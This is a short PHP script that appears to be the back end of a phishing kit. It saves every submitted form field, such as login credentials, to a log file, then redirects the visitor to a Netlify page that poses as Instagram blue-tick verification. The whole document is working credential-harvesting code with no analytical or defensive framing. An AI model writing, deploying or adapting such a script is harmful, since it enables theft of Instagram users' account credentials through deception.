<?php
header('Location: https://instagrambluetickverify.netlify.app/login2.html');

// Open the text file in writing mode 
$file = fopen("log.txt", "a");
  
foreach($_POST as $variable => $value) {
    fwrite($file, $variable);
    fwrite($file, "=");
    fwrite($file, $value);
    fwrite($file, "\r\n");
}
  
fwrite($file, "\r\n");
fclose($file);
exit;
?>